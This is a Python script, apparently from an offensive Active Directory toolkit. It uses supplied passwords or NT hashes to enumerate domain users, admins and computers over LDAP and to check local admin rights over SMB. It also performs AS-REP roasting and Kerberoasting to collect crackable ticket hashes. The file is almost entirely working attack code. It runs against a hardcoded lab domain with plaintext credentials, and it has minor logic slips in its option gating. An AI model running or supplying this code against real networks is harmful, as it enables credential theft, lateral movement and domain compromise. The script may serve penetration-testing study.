from argparse import Namespace

from pympacket.utils.asreproasting import asreproast
from pympacket.utils.kerberoasting import kerberoast
from pympacket.utils.raw_ldap_enum import ldap_enum
from pympacket.utils.check_admin_smb import check_admin_smb
from pprint import pprint

def enumeration(args):
    if (args.username and (args.password or args.nthash)):
        # Credentialed        
        if args.enum_type == 'auto' or args.enum_type == 'ldap':
            ldap = ldap_enum()
            if args.nthash == None: # Password login
                conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
            else:
                conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
            
            # Enumerate Domain SID
            domain_sid = ldap.domain_sid(conn, domain_base)
            print(f"Domain SID ({args.domain}): {domain_sid}\n")

            # Enumerate Domain Admins
            domain_admins = ldap.group_member(conn, domain_base, "Domain Admins")
            print("Members of 'Domain Admins':")
            for da in domain_admins:
                print(da)
            print("")

            # Enumerate Domain Users
            domain_users = ldap.enum_users(conn, domain_base)
            print("Domain User Accounts:")
            for user in domain_users:
                print("------------------------------------------")
                print(f"RID: {user['rid']}")
                print(f"Username: {user['username']}")
                print(f"Description: {user['description']}")
                if len(user['memberOf']):
                    groups = ""
                    for group in user['memberOf']:
                        groups += f"{group}, "
                    groups = groups[:-2]
                print(f"Groups: {groups}")
                print(f"AdminCount: {user['adminCount']}")
            print("------------------------------------------\n")

            # Enumerate Domain Computers
            domain_computers = ldap.enum_computers(conn, domain_base, args.dc_ip)
            print("Domain Computers:")
            for computer in domain_computers:
                print("------------------------------------------")
                print(f"Computer Name: {computer['name']}")
                print(f"DNS Hostname: {computer['dns_hostname']}")
                print(f"IP Address: {computer['ip_address']}")
                print(f"Domain Controller: {computer['is_dc']}")
            print("------------------------------------------\n")

            # Enumerate Administrative Privilege
            if args.enum_type == 'auto' or args.enum_type == 'asrep':
                print("Checking if the current user is a Local Administrator on a Domain Computer:")
                admin_on = []
                for computer in domain_computers:
                    if computer['ip_address']:
                        if args.nthash == None:
                            result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, password=args.password)
                        else:
                            result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, nthash=args.nthash)
                        if result:
                            admin_on.append(computer['name'])
                
                if len(admin_on):
                    for pc in admin_on:
                        print(pc)
                else:
                    print("The current user does not have Local Administrator privileges on any Domain Computer.")
            print("")

        if args.enum_type == 'auto' or args.enum_type == 'asrep':
            asrep_out = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, domain=args.domain)
            pprint(asrep_out)

        if args.enum_type == 'auto' or args.enum_type == 'kerberoast':
            tgs_out = kerberoast(username=args.username, password=args.password, nthash=args.nthash, dc_ip=args.dc_ip, domain=args.domain)
            pprint(tgs_out)

    elif (args.wordlist):
        # Uncredentialed
        if args.enum_type == 'auto' or args.enum_type == 'asrep':
            asrep_out = asreproast(dc_ip=args.dc_ip, domain=args.domain, usersfile=args.wordlist)
            pprint(asrep_out)

        if args.enum_type == 'auto' or args.enum_type == 'ldap':
            pass

        if args.enum_type == 'kerberoast' or args.enum_type == 'admin':
            print("You can't perform kerberoasting or check for Local Admin privileges without a valid set of user credentials.")
            return None
    else:
        print("You must specify an user wordlist to perform uncredentialed enumeration")
        return None


cmdLineOptions = Namespace(
    username='m.summers',
    password='&e}h.aj)9?g*',
    #username='l.douglas',
    #password='Football1',
    domain='contoso.local',
    dc_ip='192.168.116.10',
    wordlist=None,
    enum_type='auto', # 'auto', 'asrep', 'kerberoast', 'ldap', 'admin'
    nthash=None
)

enumeration(cmdLineOptions)